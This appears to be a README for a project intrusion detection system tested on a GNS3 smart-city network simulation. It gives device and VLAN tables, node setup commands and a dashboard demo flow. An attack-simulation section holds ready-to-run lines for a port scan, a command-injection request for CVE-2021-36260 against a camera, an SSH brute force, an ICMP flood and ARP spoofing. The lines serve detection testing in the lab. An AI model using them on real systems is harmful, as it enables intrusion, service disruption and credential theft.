# LightGuard IDS — GNS3 Topology Setup
## Tadhamon Smart City — Network Simulation

---

## Device IP Table (Corrected — matches Database & Frontend)

| GNS3 Node | IP Address | VLAN | Zone | Role |
|-----------|-----------|------|------|------|
| WAN-ISP-Handoff | — | WAN | Internet Uplink | ISP handoff |
| NGFW-Perimeter | — | WAN→Inside | Perimeter | Firewall / Policy |
| CORE-L3-Distribution | — | Trunk | Core | L3 routing |
| IDS-NSM-TAP / SPAN-Mirror | — | Mirror | IDS | Packet capture |
| **cam-traffic-01** | **192.168.10.11** | VLAN 10 | Transportation | Traffic Camera |
| **cam-traffic-02** | **192.168.10.12** | VLAN 10 | Transportation | Traffic Camera |
| **traffic-light-ctrl-01** | **192.168.10.13** | VLAN 10 | Transportation | Signal Controller |
| **smart-meter-01** | **192.168.20.11** | VLAN 20 | Energy Grid | Smart Meter |
| **smart-meter-02** | **192.168.20.12** | VLAN 20 | Energy Grid | Smart Meter |
| **power-distribution-01** | **192.168.20.21** | VLAN 20 | Energy Grid | Power Unit |
| **env-sensor-air-01** | **192.168.30.11** | VLAN 30 | Infrastructure | Air Sensor |
| **env-sensor-water-01** | **192.168.30.12** | VLAN 30 | Infrastructure | Water Sensor |
| **water-pump-ctrl-01** | **192.168.30.20** | VLAN 30 | Infrastructure | Pump Controller |
| **fog-node-01** | **192.168.40.11** | VLAN 40 | Compute Layer | Fog/Edge Node |
| **fog-node-02** | **192.168.40.12** | VLAN 40 | Compute Layer | Fog/Edge Node |
| **fog-node-03** | **192.168.40.21** | VLAN 40 | Compute Layer | Fog/Edge Node |
| gateway-main | 192.168.50.1 | VLAN 50 | Network | Primary Gateway |
| switch-core-01 | 192.168.50.2 | VLAN 50 | Network | Core Switch |
| **workstation-ops-01** | **192.168.99.11** | VLAN 99 | Control Center | SOC Workstation |
| **workstation-ops-02** | **192.168.99.12** | VLAN 99 | Control Center | Analyst Station |
| **scada-server-01** | **192.168.99.20** | VLAN 99 | Control Center | SCADA Server |
| LightGuard-IDS-Server | 192.168.99.10 | VLAN 99 | Control Center | Main IDS Server |

---

## VLAN Segmentation (matches frontend exactly)

| VLAN ID | Zone Name | Subnet | Devices |
|---------|-----------|--------|---------|
| VLAN 10 | Transportation | 192.168.10.0/24 | Traffic cameras, Signal controllers |
| VLAN 20 | Energy Grid | 192.168.20.0/24 | Smart meters, Power distribution |
| VLAN 30 | Infrastructure | 192.168.30.0/24 | Environmental sensors, Water pumps |
| VLAN 40 | Compute Layer | 192.168.40.0/24 | Fog nodes (edge IDS processing) |
| VLAN 50 | Network | 192.168.50.0/24 | Gateways, Core switches |
| VLAN 99 | Control Center | 192.168.99.0/24 | SOC workstations, SCADA, IDS server |

---

## VPCS Device Configuration Commands

Run these commands in each VPCS node after starting the topology:

```
# cam-traffic-01 (VPCS)
ip 192.168.10.11/24 192.168.10.1

# cam-traffic-02 (VPCS)
ip 192.168.10.12/24 192.168.10.1

# traffic-light-ctrl-01 (VPCS)
ip 192.168.10.13/24 192.168.10.1

# smart-meter-01 (VPCS)
ip 192.168.20.11/24 192.168.20.1

# smart-meter-02 (VPCS)
ip 192.168.20.12/24 192.168.20.1

# power-distribution-01 (VPCS)
ip 192.168.20.21/24 192.168.20.1

# env-sensor-air-01 (VPCS)
ip 192.168.30.11/24 192.168.30.1

# env-sensor-water-01 (VPCS)
ip 192.168.30.12/24 192.168.30.1

# water-pump-ctrl-01 (VPCS)
ip 192.168.30.20/24 192.168.30.1

# fog-node-01 (VPCS)
ip 192.168.40.11/24 192.168.40.1

# fog-node-02 (VPCS)
ip 192.168.40.12/24 192.168.40.1

# fog-node-03 (VPCS)
ip 192.168.40.21/24 192.168.40.1

# gateway-main (VPCS)
ip 192.168.50.1/24 192.168.50.254

# workstation-ops-01 (VPCS)
ip 192.168.99.11/24 192.168.99.1

# workstation-ops-02 (VPCS)
ip 192.168.99.12/24 192.168.99.1

# scada-server-01 (VPCS)
ip 192.168.99.20/24 192.168.99.1
```

---

## Attack Simulation Commands (Kali — VLAN 99)

```bash
# Port Scan — Transportation zone
nmap -sS -p 1-65535 192.168.10.0/24

# Target traffic camera CVE-2021-36260
curl -X PUT "http://192.168.10.11/SDK/webLanguage" --data '<?xml version="1.0"?><language>$(id)</language>'

# SSH Brute Force — Fog nodes
hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://192.168.40.11

# ICMP Flood (DoS) — Smart meters
hping3 --flood --icmp 192.168.20.11

# ARP Spoofing — Transportation VLAN
arpspoof -i eth0 -t 192.168.10.11 192.168.10.1
```

---

## LightGuard Real-Traffic Demo Flow

Use this flow for the project presentation so the dashboard is not showing mock-only traffic.

1. Start LightGuard backend and frontend.

```bash
uvicorn backend.main:app --host 0.0.0.0 --port 8000
cd frontend && npm run dev
```

2. Open the GNS3 topology file:

```text
gns3/LightGuard_Tadhamon.gns3
```

3. Start Wireshark on the GNS3 link or SPAN/TAP interface connected to `IDS-NSM-TAP`.
   Use a display filter such as:

```text
ip.addr == 192.168.10.11 || tcp.port == 554 || tcp.flags.syn == 1
```

4. Generate attack traffic from the attacker/SOC workstation node, or replay demo packets into LightGuard:

```bash
python3 scripts/gns3_traffic_feeder.py --login --attack port_scan --count 25 --interval 0.5
python3 scripts/gns3_traffic_feeder.py --login --attack cve_2021_36260 --count 5 --interval 1
```

5. Open these LightGuard pages side by side:

- `/live-packets`: packet stream from `/api/packets/live` and `ws://host/ws/packets`.
- `/alerts`: correlated IDS alerts from the same traffic.
- `/logs`: severity / zone / attack type / action trail.
- `/topology`: live attack path between source and target nodes.

6. For a PCAP/Wireshark evidence demo, save the capture from Wireshark as `demo_attack.pcap`, then replay it:

```bash
python3 scripts/gns3_traffic_feeder.py --login --pcap demo_attack.pcap --count 100
```

The expected evidence is: Wireshark shows the packets, LightGuard Live Packets shows matching source/destination/protocol rows, Alerts records the high-severity event, and Topology draws the live path.

---

## Traffic Flow — LightGuard IDS

```
IoT Devices (VLAN 10/20/30)
         ↓
  TOR Switch → ACC Switch
         ↓
  CORE-L3-Distribution
         ↓
  IDS-NSM-TAP / SPAN-Mirror ← (mirror port)
         ↓
  LightGuard IDS Server (192.168.99.10)
         ↓
  AI Detection → Alert → Dashboard
```

LOW/MEDIUM alerts: logged locally on Fog Nodes (VLAN 40)
HIGH/CRITICAL alerts: forwarded to LightGuard IDS (VLAN 99)

---

## Run LightGuard IDS

```bash
cd /home/ubuntu/LightGuard
pip install -r backend/requirements.txt --break-system-packages
cd backend
uvicorn main:app --host 0.0.0.0 --port 8000
# Frontend
cd ../frontend && npm run build && npm run preview
```
